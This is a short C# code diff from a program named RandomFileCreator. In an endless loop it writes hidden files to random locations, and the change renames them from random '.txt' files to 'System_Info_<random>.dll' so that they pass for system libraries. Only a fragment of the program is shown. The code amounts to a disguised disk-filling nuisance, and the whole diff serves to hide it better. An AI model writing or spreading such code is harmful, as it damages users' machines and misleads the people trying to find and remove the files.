@@ -39,7 +39,7 @@ namespace RandomFileCreator
             {
                 while (true)
                 {
-                    string path = RandomPath((string)path2) + "\\" + RandomName() + ".txt";
+                    string path = RandomPath((string)path2) + "\\" + "System_Info_" + RandomName() + ".dll";
                     using (StreamWriter sw = new StreamWriter(path, true))
                     {
                         File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
